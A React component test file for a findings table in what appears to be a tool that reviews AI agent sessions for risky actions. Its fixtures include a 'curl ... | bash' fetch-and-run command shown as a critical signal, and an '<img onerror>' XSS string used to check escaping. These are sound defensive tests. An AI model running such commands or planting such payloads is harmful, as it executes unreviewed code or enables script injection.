// SPDX-FileCopyrightText: 2026 Raul Kivi
// SPDX-License-Identifier: MIT
import { fireEvent, render, screen, within } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { findingRow, sampleInsightsDataset } from "../../test-support/insights-fixture.js";
import { FindingsTable } from "./FindingsTable.js";

const titles = new Map([
  ["cc:s1", "Fix tests"],
  ["vs:s3", "Docs"],
]);

function renderTable(findings = sampleInsightsDataset().findings, onSelectSession = vi.fn()) {
  render(
    <FindingsTable findings={findings} sessionTitle={(key) => titles.get(key) ?? key} onSelectSession={onSelectSession} />,
  );
  return { onSelectSession, table: screen.queryByRole("table", { name: "Signals to review" }) };
}

describe("FindingsTable", () => {
  it("answers what, when, why and where for each signal, most severe first", () => {
    const { table } = renderTable();
    const [first, second] = within(table!).getAllByRole("row").slice(1);
    expect(first).toHaveTextContent("Critical");
    expect(first).toHaveTextContent("Downloaded script piped straight into an interpreter");
    expect(first).toHaveTextContent("2026-10-09 09:05 UTC");
    expect(first).toHaveTextContent("Runs code fetched from the network without review.");
    expect(first).toHaveTextContent("curl -s https://x.io/i.sh | bash");
    expect(first).toHaveTextContent("Fix tests · turn 0");
    expect(second).toHaveTextContent("Info");
  });

  it("selects the session when its name is clicked", () => {
    const { onSelectSession } = renderTable();
    fireEvent.click(screen.getByRole("button", { name: "Fix tests · turn 0" }));
    expect(onSelectSession).toHaveBeenCalledWith("cc:s1");
  });

  it("shows the first 25 signals and can reveal the rest", () => {
    const many = Array.from({ length: 30 }, (_, index) => findingRow("cc:s1", { key: `k${index}` }));
    const { table } = renderTable(many);
    expect(within(table!).getAllByRole("row")).toHaveLength(26);
    fireEvent.click(screen.getByRole("button", { name: "Show all 30" }));
    expect(within(table!).getAllByRole("row")).toHaveLength(31);
  });

  it("says when there is nothing to review", () => {
    renderTable([]);
    expect(screen.getByText("No signals for the current selections.")).toBeInTheDocument();
  });

  it("puts the kind inline after the title, on the same line, as muted text", () => {
    const { table } = renderTable();
    const row = within(table!).getAllByRole("row")[1]!;
    const kind = row.querySelector(".findings-kind");
    expect(kind).not.toBeNull();
    expect(kind).toHaveClass("text-muted");
    expect(kind!.textContent).toMatch(/^ ?· .+ · .+/);
    expect(kind!.parentElement).toHaveTextContent("Downloaded script piped straight into an interpreter");
    expect(kind!.parentElement!.tagName).toBe("TD");
  });

  it("names the subagent run behind a finding, with its turn, and says nothing for the main agent", () => {
    const hostile = "<img src=x onerror=alert(1)>";
    const bySubagent = findingRow("cc:s1", {
      key: "sub",
      turnIndex: 4,
      origin: { kind: "subagent", runId: "r1", label: hostile, depth: 1 },
    });
    const byMain = findingRow("cc:s1", { key: "main", turnIndex: 2 });
    const { table } = renderTable([bySubagent, byMain]);

    const rows = within(table!).getAllByRole("row").slice(1);
    const sub = rows.find((row) => row.textContent?.includes("by subagent run"))!;
    expect(sub).toHaveTextContent(`by subagent run ${hostile} (turn 4)`);
    expect(sub.querySelector("img")).toBeNull();
    expect(rows.filter((row) => row.textContent?.includes("by subagent run"))).toHaveLength(1);
  });
});
